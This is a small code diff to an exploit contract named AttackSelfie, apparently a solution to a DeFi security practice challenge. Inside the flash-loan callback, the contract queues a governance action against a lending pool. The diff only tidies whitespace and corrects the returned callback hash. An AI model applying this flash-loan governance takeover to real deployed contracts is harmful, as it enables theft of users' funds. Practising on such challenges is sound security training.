@@ -20,7 +20,7 @@ interface IGovernance {
         uint128 value,
         bytes calldata data
     ) external returns (uint256 actionId);
-    
+
     function getActionCounter() external returns (uint256);
 }
 
@@ -78,6 +78,6 @@ contract AttackSelfie is IERC3156FlashBorrower {
         governance.queueAction(address(pool), 0, data);
         uint count = governance.getActionCounter();
         token.approve(address(pool), _amount);
-        return keccak256("ERC3156FlashBorrower.onFlashLoan(address,address,uint256,uint256,bytes)");
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
     }
 }
